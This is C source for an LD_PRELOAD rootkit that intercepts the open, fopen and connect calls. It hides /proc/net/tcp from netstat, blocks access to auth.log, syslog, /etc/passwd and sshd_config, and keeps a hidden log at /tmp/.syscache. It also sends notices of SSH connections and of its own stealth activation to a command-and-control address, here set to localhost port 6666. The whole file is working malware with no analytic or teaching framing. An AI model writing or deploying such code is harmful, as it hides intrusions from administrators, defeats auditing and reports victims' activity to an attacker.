#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <stdarg.h>

static int (*real_open)(const char *pathname, int flags, ...);
static FILE *(*real_fopen)(const char *pathname, const char *mode);
static int (*real_connect)(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
static int hook_count = 0, ssh_hook_count = 0, netstat_hidden = 0, inside_hook = 0;

#define C2_IP "127.0.0.1"
#define C2_PORT 6666
#define LOG_FILE "/tmp/.syscache"

static int should_block_file(const char *pathname) {
    if (!pathname) return 0;
    const char *blocked[] = {"/var/log/auth.log", "/var/log/syslog", "/etc/passwd", "/etc/ssh/sshd_config", NULL};
    for (int i = 0; blocked[i]; i++) {
        if (strstr(pathname, blocked[i])) return 1;
    }
    return 0;
}

static int should_hide_netstat(const char *pathname) {
    if (!pathname) return 0;
    return strcmp(pathname, "/proc/net/tcp") == 0 || strcmp(pathname, "/proc/net/tcp6") == 0;
}

static int is_ssh_connection(const struct sockaddr *addr, socklen_t addrlen) {
    if (!addr || addr->sa_family != AF_INET) return 0;
    struct sockaddr_in *sin = (struct sockaddr_in*)addr;
    return ntohs(sin->sin_port) == 22;
}

static void send_to_c2(const char *data, size_t len, const char *type) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;
    
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_IP, &addr.sin_addr);
    
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
        char header[128];
        snprintf(header, sizeof(header), "[%s][PID:%d] %zd bytes\n", type, getpid(), len);
        send(sock, header, strlen(header), 0);
        send(sock, data, len, 0);
        fprintf(stderr, "C2 SENT: %s (PID %d)\n", type, getpid());  
    } else {
        fprintf(stderr, "C2 CONNECT FAILED for %s (PID %d)\n", type, getpid());  
    }
    close(sock);
}

static void hidden_log(const char *pathname, int flags, int result) {
    if (inside_hook || hook_count > 10) return;
    FILE *log = fopen(LOG_FILE, "a");
    if (!log) return;
    char *flag_str = "";
    if (flags & O_WRONLY) flag_str = " WRITE";
    if (flags & O_RDONLY) flag_str = " READ";
    if (flags & O_CREAT) flag_str = " CREATE";
    fprintf(log, "[%d] open('%s'%s) = %d\n", getpid(), pathname ? pathname : "NULL", flag_str, result);
    fclose(log);
}

int open(const char *pathname, int flags, ...) {
    if (inside_hook) {
        if (!real_open) return -1;
        va_list args;
        va_start(args, flags);
        mode_t mode = 0;
        if (flags & O_CREAT) mode = va_arg(args, mode_t);
        va_end(args);
        return real_open(pathname, flags, mode);
    }
    inside_hook = 1;
    
    if (!real_open) real_open = dlsym(RTLD_NEXT, "open");
    
    if (should_hide_netstat(pathname)) {
        fprintf(stderr, "🔒 BLOCKING NETSTAT: %s (PID %d)\n", pathname, getpid());  
        if (netstat_hidden == 0) {
            send_to_c2("NETSTAT_HIDING_ACTIVATED", 23, "STEALTH");
            netstat_hidden = 1;
        }
        errno = ENOENT;
        inside_hook = 0;
        return -1;
    }
    
    va_list args;
    va_start(args, flags);
    mode_t mode = 0;
    if (flags & O_CREAT) mode = va_arg(args, mode_t);
    va_end(args);
    
    if (should_block_file(pathname)) {
        hidden_log(pathname, flags, -1);
        errno = ENOENT;
        inside_hook = 0;
        return -1;
    }
    
    int result = real_open(pathname, flags, mode);
    hook_count++;
    if (hook_count <= 10) hidden_log(pathname, flags, result);
    inside_hook = 0;
    return result;
}

FILE *fopen(const char *pathname, const char *mode) {
    if (inside_hook) return real_fopen ? real_fopen(pathname, mode) : NULL;
    inside_hook = 1;
    
    if (!real_fopen) real_fopen = dlsym(RTLD_NEXT, "fopen");
    
    if (should_block_file(pathname) || should_hide_netstat(pathname)) {
        hidden_log(pathname, 0, 0);
        errno = ENOENT;
        inside_hook = 0;
        return NULL;
    }
    
    FILE *result = real_fopen(pathname, mode);
    inside_hook = 0;
    return result;
}

int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {
    if (!real_connect) real_connect = dlsym(RTLD_NEXT, "connect");
    
    if (is_ssh_connection(addr, addrlen)) {
        fprintf(stderr, "🔍 SSH HOOK TRIGGERED (PID %d)\n", getpid()); 
        char msg[256];
        snprintf(msg, sizeof(msg), "SSH_CONNECTION_DETECTED: PID=%d sockfd=%d", getpid(), sockfd);
        send_to_c2(msg, strlen(msg), "SSH_LOGIN");
        ssh_hook_count++;
    }
    
    return real_connect(sockfd, addr, addrlen);
}